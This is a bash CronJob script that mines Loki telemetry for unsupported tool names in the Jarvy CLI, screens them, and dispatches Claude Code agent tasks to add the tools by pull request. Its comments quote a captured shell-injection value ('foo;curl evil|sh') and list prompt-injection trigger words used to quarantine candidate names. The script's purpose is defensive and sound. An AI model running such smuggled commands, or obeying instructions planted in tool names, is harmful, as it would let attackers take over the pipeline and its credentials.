#!/usr/bin/env bash
#
# Discover tool names that users requested in Jarvy but aren't in the
# registry yet, by querying Grafana Cloud Loki for the
# `event=tool.unsupported` log events the Jarvy CLI emits at
# src/commands/setup_cmd.rs:298-323. For each new tool not already in
# an open Jarvy PR/issue, spawn a Kelos Task that scaffolds the tool
# and opens a PR.
#
# Architecture:
#   This CronJob (jarvy-tool-discovery) → bash queries Loki via the
#   /loki/api/v1/query_range endpoint → de-dupes against open Jarvy
#   PRs/issues labeled `tool-request` → for each new name, kubectl
#   create a Kelos Task with the matching workspace + AgentConfig.
#
# Env required (provided by the CronJob template):
#   LOKI_URL          e.g. https://logs-prod-006.grafana.net
#   LOKI_USER         Loki instance ID (numeric, from Grafana Cloud)
#   LOKI_TOKEN        Cloud Access Policy token with logs:read scope
#   GH_TOKEN          example-org App installation token (for PR lookups)
#   MAX_DISPATCH      cap on Tasks spawned per run (default: 3 — keeps
#                     OAuth burn bounded if a flood lands)
#   WINDOW_HOURS      look-back window in hours (default: 168 = 7d)
#   DRY_RUN           if set to "1", log decisions but spawn no Tasks
#
# Exits 0 on success (including "no new tools found"), 1 on tool errors,
# 2 on auth/network errors that warrant a Discord alert.

set -euo pipefail

: "${LOKI_URL:?LOKI_URL is required (e.g. https://logs-prod-006.grafana.net)}"
: "${LOKI_USER:?LOKI_USER is required (Loki instance ID)}"
: "${LOKI_TOKEN:?LOKI_TOKEN is required (logs:read CAP token)}"
: "${GH_TOKEN:?GH_TOKEN is required (App installation token)}"

MAX_DISPATCH="${MAX_DISPATCH:-3}"
WINDOW_HOURS="${WINDOW_HOURS:-168}"
DRY_RUN="${DRY_RUN:-0}"
REPO="example-org/Jarvy"

log()  { printf '[%s] %s\n' "$(date -u +%H:%M:%SZ)" "$*" >&2; }
die()  { log "ERROR: $*"; exit 1; }

# ────────────────────────────────────────────────────────────────────────────
# 1. Query Loki for distinct tool names in the look-back window.
# ────────────────────────────────────────────────────────────────────────────
# LogQL targets the jarvy-telemetry forwarder's service_name and filters
# for the canonical event taxonomy emitted by setup_cmd.rs. The
# `| json` stage parses the JSON-encoded event payload so we can pull
# the `tool` field cleanly.
#
# Time range: Loki accepts unix-nanos. The Grafana Cloud retention for
# the trial / pro plans is at least 30d, so a 7d window is safe.
NOW_NS=$(date -u +%s)000000000
START_NS=$(( NOW_NS - (WINDOW_HOURS * 3600 * 1000000000) ))

# Quoting: the LogQL selector embeds `event="tool.unsupported"` which
# requires escaped double-quotes inside the curl --data-urlencode arg.
# Using printf %s is intentional — bash's $(...) eats trailing whitespace
# but Loki tolerates it; the curl encoder handles the special characters.
QUERY='sum by (tool) (count_over_time({service_name="jarvy"} | json | event="tool.unsupported" [1h]))'

log "querying Loki at $LOKI_URL over past ${WINDOW_HOURS}h"
LOKI_RESP=$(
  curl --silent --show-error --fail \
    --user "${LOKI_USER}:${LOKI_TOKEN}" \
    --data-urlencode "query=${QUERY}" \
    --data-urlencode "start=${START_NS}" \
    --data-urlencode "end=${NOW_NS}" \
    --data-urlencode "step=1h" \
    --data-urlencode "limit=1000" \
    -G "${LOKI_URL}/loki/api/v1/query_range" \
  || { log "Loki query failed (network / auth)"; exit 2; }
)

# Extract the distinct tool names. Loki's matrix response has
# `data.result[]` with `metric.tool` and a `values` series; we just
# care about the unique label set.
REQUESTED_TOOLS=$(
  echo "$LOKI_RESP" \
    | jq -r '.data.result[]?.metric.tool // empty' \
    | grep -vE '^[[:space:]]*$' \
    | sort -u
)

if [ -z "$REQUESTED_TOOLS" ]; then
  log "no tool.unsupported events in past ${WINDOW_HOURS}h — nothing to do"
  exit 0
fi

log "Loki returned $(echo "$REQUESTED_TOOLS" | wc -l | tr -d ' ') distinct requested tool name(s)"

# ────────────────────────────────────────────────────────────────────────────
# 2. Classify each candidate via the 3-band validator. Threat model:
#    a malicious user can put any string in their jarvy.toml key; the
#    telemetry sanitizer strips control bytes but does NOT enforce the
#    strict regex. Real captured Loki entries included `foo;curl evil|sh`.
#    We MUST NOT feed an un-revalidated name into an LLM prompt.
#
#    - safe       → dispatch normally
#    - quarantine → write to ConfigMap tool-discovery-quarantine for
#                   human review; do not dispatch
#    - reject     → drop silently (regex failure — log entry was likely
#                   garbage / fixture / shell injection)
#
#    Test suite at ci/scripts/tests/test-validate-tool-name.sh.
# ────────────────────────────────────────────────────────────────────────────
LIB_DIR="$(dirname "$0")/lib"
# shellcheck source=lib/validate-tool-name.sh
source "${LIB_DIR}/validate-tool-name.sh"

SAFE_TOOLS=()
QUARANTINE_TOOLS=()
REJECTED_COUNT=0
FIXTURE_COUNT=0
while IFS= read -r candidate; do
  [ -z "$candidate" ] && continue
  # Test-fixture pre-filter — these never warrant attention even if
  # they pass the validator (the validator's job is safety, not noise
  # reduction). Captured from real Loki output: `totally-fake-tool-xyz`,
  # `seamless-fake-tool`, etc.
  case "$candidate" in
    test*|fake*|foo*|bar*|baz*|seamless-*|totally-*|zzz-*|definitely-not-*)
      FIXTURE_COUNT=$((FIXTURE_COUNT + 1))
      continue
      ;;
  esac
  band=$(validate_tool_name "$candidate")
  case "$band" in
    safe)       SAFE_TOOLS+=("$candidate") ;;
    quarantine) QUARANTINE_TOOLS+=("$candidate") ;;
    reject)     REJECTED_COUNT=$((REJECTED_COUNT + 1)) ;;
  esac
done <<< "$REQUESTED_TOOLS"

log "validator classified candidates — safe: ${#SAFE_TOOLS[@]}, quarantine: ${#QUARANTINE_TOOLS[@]}, reject: ${REJECTED_COUNT}, fixture: ${FIXTURE_COUNT}"

# Persist quarantined names to a ConfigMap (cluster-gated) AND open a
# GitHub issue with a sanitized summary (counts + hash prefixes only).
# Hard rule: NEVER write raw candidate strings to stdout, the issue
# body, or anywhere outside the ConfigMap — the candidate IS the
# attacker's payload, and surfacing it elsewhere risks (a) leaking the
# injection text to anyone with read access to the issue, and (b)
# accidentally feeding it back into a downstream LLM context if the
# issue gets searched/indexed/embedded.
#
# The ConfigMap stays the canonical source for human review via
# `kubectl get cm tool-discovery-quarantine -n kelos-system -o yaml`.
# The GitHub issue is a notification only.
if [ "${#QUARANTINE_TOOLS[@]}" -gt 0 ]; then
  QUARANTINE_TS=$(date -u +%FT%TZ)
  QUARANTINE_DATE=$(date -u +%F)

  # Compute SHA-256 prefix for each quarantined candidate. Prefix length
  # 12 hex chars is enough to disambiguate the typical 1-10 entries per
  # run while being short enough to keep the issue body scannable. The
  # raw candidate stays only in the ConfigMap data.
  declare -a HASHES=()
  declare -a CM_LINES=()
  for cand in "${QUARANTINE_TOOLS[@]}"; do
    h=$(printf '%s' "$cand" | shasum -a 256 2>/dev/null | awk '{print $1}' | cut -c1-12)
    # Fallback for environments without `shasum`: openssl, then sha256sum.
    [ -z "$h" ] && h=$(printf '%s' "$cand" | openssl dgst -sha256 2>/dev/null | awk '{print $NF}' | cut -c1-12)
    [ -z "$h" ] && h=$(printf '%s' "$cand" | sha256sum 2>/dev/null | awk '{print $1}' | cut -c1-12)
    [ -z "$h" ] && h="hash-unavailable"
    HASHES+=("$h")
    CM_LINES+=("  ${h}: ${cand}")
  done
  log "quarantined ${#QUARANTINE_TOOLS[@]} candidate(s) — hashes only: ${HASHES[*]}"

  # Build ConfigMap data block: hash → candidate. Each line is one
  # quarantine entry. The candidates are guaranteed to be strict-ASCII
  # (regex band; quarantine triggers only on candidates that PASS the
  # regex but match a trigger-token substring) so embedding them in
  # YAML is safe — no escape needed.
  CM_DATA=$(printf '%s\n' "${CM_LINES[@]}")

  cat <<EOF | kubectl apply -f - >/dev/null 2>&1 || log "WARN: failed to write quarantine ConfigMap (continuing)"
apiVersion: v1
kind: ConfigMap
metadata:
  name: tool-discovery-quarantine
  namespace: kelos-system
  labels:
    app.kubernetes.io/managed-by: tool-discovery-cron
data:
  last-updated: "${QUARANTINE_TS}"
  reason: "candidates passed strict regex but matched a prompt-injection trigger token; see ci/scripts/lib/validate-tool-name.sh"
  candidates-by-hash: |
${CM_DATA}
EOF

  # ───────────────────────────────────────────────────────────────────
  # Open / update a GitHub issue on example-org/k8-infra. Title uses the
  # UTC date so re-running the cron on the same day finds the existing
  # open issue and comments on it instead of opening a duplicate.
  # ───────────────────────────────────────────────────────────────────
  ISSUE_REPO="${ISSUE_REPO:-example-org/k8-infra}"
  ISSUE_TITLE="tool-discovery: quarantined candidates ${QUARANTINE_DATE}"
  ISSUE_LABEL="tool-discovery-quarantine"

  EXISTING_ISSUE=$(
    curl --silent --show-error --fail -G \
      -H "Authorization: token $GH_TOKEN" \
      -H "Accept: application/vnd.github.v3+json" \
      --data-urlencode "q=repo:${ISSUE_REPO} is:issue is:open in:title \"${ISSUE_TITLE}\"" \
      "https://api.github.com/search/issues" \
    | jq -r '.items[0].number // empty' 2>/dev/null
  ) || EXISTING_ISSUE=""

  HASH_LIST=$(printf -- '- \`%s\`\n' "${HASHES[@]}")
  # Body intentionally contains NO raw candidate strings — only hashes,
  # counts, and the kubectl recipe to inspect the ConfigMap securely.
  ISSUE_BODY=$(cat <<MARKDOWN
Tool-discovery cron quarantined **${#QUARANTINE_TOOLS[@]}** candidate name(s) at \`${QUARANTINE_TS}\`.

Each candidate passed the strict structural regex but matched a
prompt-injection trigger token (ignore / system / override / reveal /
you-are / etc.). The validator deliberately holds these for human
review rather than dispatching a Kelos Task with attacker-influenced
content in the prompt.

**Candidate hashes (sha256 first-12)**:

${HASH_LIST}

The raw candidate strings are intentionally NOT in this issue body —
exposing them here could (a) leak the injection payload to anyone with
read access and (b) feed it back into a downstream LLM context if the
issue gets searched, embedded, or copy-pasted.

To inspect the actual strings (kubectl-gated):

\`\`\`bash
kubectl -n kelos-system get cm tool-discovery-quarantine -o yaml
\`\`\`

For each entry, decide:

- **Genuine tool request** with an unfortunate-looking name → open the
  Jarvy PR manually (do NOT add the trigger token to the suppress list).
- **Injection attempt or junk** → no action needed; the validator
  already blocked dispatch. Optionally add a suppress-list entry in
  \`ci/scripts/lib/validate-tool-name.sh\` for the pattern family.

Close this issue once reviewed. Auto-opened by
\`ci/scripts/jarvy-tool-discovery.sh\`.
MARKDOWN
)

  if [ -n "$EXISTING_ISSUE" ]; then
    log "updating existing quarantine issue #${EXISTING_ISSUE} on ${ISSUE_REPO}"
    curl --silent --show-error --fail \
      -X POST \
      -H "Authorization: token $GH_TOKEN" \
      -H "Accept: application/vnd.github.v3+json" \
      -d "$(jq -n --arg b "$ISSUE_BODY" '{body: $b}')" \
      "https://api.github.com/repos/${ISSUE_REPO}/issues/${EXISTING_ISSUE}/comments" \
      >/dev/null || log "WARN: failed to comment on existing quarantine issue"
  else
    log "opening new quarantine issue on ${ISSUE_REPO}"
    curl --silent --show-error --fail \
      -X POST \
      -H "Authorization: token $GH_TOKEN" \
      -H "Accept: application/vnd.github.v3+json" \
      -d "$(jq -n --arg t "$ISSUE_TITLE" --arg b "$ISSUE_BODY" --arg l "$ISSUE_LABEL" \
            '{title: $t, body: $b, labels: [$l]}')" \
      "https://api.github.com/repos/${ISSUE_REPO}/issues" \
      >/dev/null || log "WARN: failed to open quarantine issue"
  fi
fi

if [ "${#SAFE_TOOLS[@]}" -eq 0 ]; then
  log "no safe candidates after validation — exiting clean"
  exit 0
fi
log "${#SAFE_TOOLS[@]} candidate(s) cleared the validator: ${SAFE_TOOLS[*]}"

# ────────────────────────────────────────────────────────────────────────────
# 3. Cross-reference candidates against THREE sources of "already covered":
#    a) The Jarvy registry on `main` (docs/tools-registry.md is the
#       canonical list — regenerated by scripts/gen-docs.sh after every
#       new-tool merge, so it's authoritative for what's installable).
#    b) Open PRs on example-org/Jarvy (the tool is in flight).
#    c) Open tool-request issues (the tool was filed but not yet built).
#
#    Telemetry events can be stale or come from clients running outdated
#    Jarvy versions, so a tool can show up as `tool.unsupported` even
#    after we've already added it. Skipping registered tools prevents
#    duplicate-PR noise.
# ────────────────────────────────────────────────────────────────────────────

log "fetching registered tool names from ${REPO} main (docs/tools-registry.md)"
# The markdown table rows look like:  | `act` | `act` | `brew: act` | ...
# Extract the first-column tool name. Strict regex matches the same
# shape jarvy enforces (lowercase letter start, alnum / _ / -).
REGISTERED_TOOLS=$(
  curl --silent --show-error --fail \
    -H "Authorization: token $GH_TOKEN" \
    -H "Accept: application/vnd.github.v3.raw" \
    "https://api.github.com/repos/${REPO}/contents/docs/tools-registry.md?ref=main" \
  | sed -nE 's/^\| `([a-z][a-z0-9_-]*)`.*/\1/p' \
  | sort -u
)
REGISTERED_COUNT=$(printf '%s\n' "$REGISTERED_TOOLS" | grep -cve '^$' || true)
if [ "$REGISTERED_COUNT" -lt 50 ]; then
  # Sanity guard: the registry has 200+ entries. If we got fewer than 50,
  # the fetch / parse broke and we should NOT proceed (the agent might
  # otherwise open PRs for tools that are already implemented).
  log "ERROR: registry fetch returned only ${REGISTERED_COUNT} tools — refusing to run (expected 50+). Aborting safely."
  exit 1
fi
log "registry has ${REGISTERED_COUNT} tool(s) on main"

log "fetching open PRs and tool-request issues from ${REPO}"
EXISTING_PRS=$(
  curl --silent --show-error --fail \
    -H "Authorization: token $GH_TOKEN" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/${REPO}/pulls?state=open&per_page=100" \
  | jq -r '.[].title // empty'
)
EXISTING_ISSUES=$(
  curl --silent --show-error --fail \
    -H "Authorization: token $GH_TOKEN" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/${REPO}/issues?state=open&labels=tool-request&per_page=100" \
  | jq -r '.[].title // empty'
)
EXISTING_ALL=$(printf '%s\n%s\n' "$EXISTING_PRS" "$EXISTING_ISSUES" | tr '[:upper:]' '[:lower:]')

NEW_TOOLS=()
for tool in "${SAFE_TOOLS[@]}"; do
  # (a) Already in the registry on main → skip silently. This is the
  # most common reason a `tool.unsupported` event survives the filter
  # in steady state (older Jarvy client, stale telemetry, etc.).
  if grep -qFx "$tool" <<< "$REGISTERED_TOOLS"; then
    log "skip ${tool} — already in Jarvy registry"
    continue
  fi
  # (b/c) In flight via PR or issue.
  if echo "$EXISTING_ALL" | grep -qE "\\[tool\\]:?[[:space:]]+\\<${tool}\\>|add ${tool}\\>|tool ${tool}\\>"; then
    log "skip ${tool} — already has an open PR or tool-request issue"
    continue
  fi
  NEW_TOOLS+=("$tool")
done

if [ "${#NEW_TOOLS[@]}" -eq 0 ]; then
  log "every requested tool is already in the registry, an open PR, or an open issue — nothing to do"
  exit 0
fi
log "${#NEW_TOOLS[@]} new tool(s) to dispatch (capped at ${MAX_DISPATCH}): ${NEW_TOOLS[*]}"

# ────────────────────────────────────────────────────────────────────────────
# 4. For each new tool (up to MAX_DISPATCH), spawn a Kelos Task. The
#    Task uses the jarvy workspace + tool-discoverer AgentConfig and
#    receives the tool name via podOverrides.env.
# ────────────────────────────────────────────────────────────────────────────
DISPATCHED=0
for tool in "${NEW_TOOLS[@]}"; do
  [ "$DISPATCHED" -ge "$MAX_DISPATCH" ] && { log "MAX_DISPATCH=${MAX_DISPATCH} reached — deferring rest to next run"; break; }

  if [ "$DRY_RUN" = "1" ]; then
    log "DRY_RUN: would dispatch tool-discoverer for '${tool}'"
    DISPATCHED=$((DISPATCHED + 1))
    continue
  fi

  # Quoted heredoc → no shell expansion. Then sed-substitute the
  # placeholders so the tool name + repo cannot accidentally break the
  # YAML (backticks, $vars, etc. inside the prompt are inert in the
  # source and never re-interpreted by sed).
  TASK_YAML=$(cat <<'YAML' | sed "s|__TOOL__|${tool}|g; s|__REPO__|${REPO}|g"
apiVersion: kelos.dev/v1alpha1
kind: Task
metadata:
  generateName: tool-discoverer-__TOOL__-
  namespace: kelos-system
  labels:
    app.kubernetes.io/managed-by: tool-discovery-cron
    kelos.dev/role: tool-discoverer
    jarvy.io/requested-tool: "__TOOL__"
spec:
  type: claude-code
  credentials:
    type: oauth
    secretRef: {name: claude-code-oauth}
  agentConfigRef: {name: tool-discoverer}
  workspaceRef: {name: jarvy}
  ttlSecondsAfterFinished: 7200
  podOverrides:
    env:
      - name: GH_TOKEN
        valueFrom:
          secretKeyRef: {name: github-app-token, key: token}
      - {name: TOOL_NAME, value: "__TOOL__"}
      - {name: REPO,      value: "__REPO__"}
  prompt: |
    Telemetry data from Loki indicates users tried to install the tool
    named __TOOL__ via jarvy.toml but the tool is not in the registry.
    Your job is to add it, following the AgentConfig protocol literally.

    Tool name to add: __TOOL__.

    Start by reading docs/tools-registry.md and at least one comparable
    existing definition.rs (for example src/tools/ruff/definition.rs)
    to understand the install matrix conventions. Verify on the
    Homebrew, Alpine apk, winget, and FreeBSD ports indexes that the
    package actually exists under that name before declaring an
    install entry; never invent a package name. If you cannot find
    the tool on any package index, post a GitHub issue with the
    tool-request label instead of opening a PR and stop.

    After scaffolding and verifying cargo check is clean, regenerate
    docs/tools-registry.md via bash scripts/gen-docs.sh, then open a
    PR on a fresh branch named feat/tool-__TOOL__. Commit message
    format: feat(tools) add __TOOL__ with a body that names the source
    signal (requested via tool.unsupported telemetry events), the
    package matrix, and the intentional distro omissions.
YAML
)

  if echo "$TASK_YAML" | kubectl apply -f - >/dev/null; then
    log "dispatched tool-discoverer for ${tool}"
    DISPATCHED=$((DISPATCHED + 1))
  else
    log "FAILED to dispatch tool-discoverer for ${tool} (kubectl apply error)"
  fi
done

log "done — dispatched ${DISPATCHED} of ${#NEW_TOOLS[@]} candidate tool(s)"
exit 0
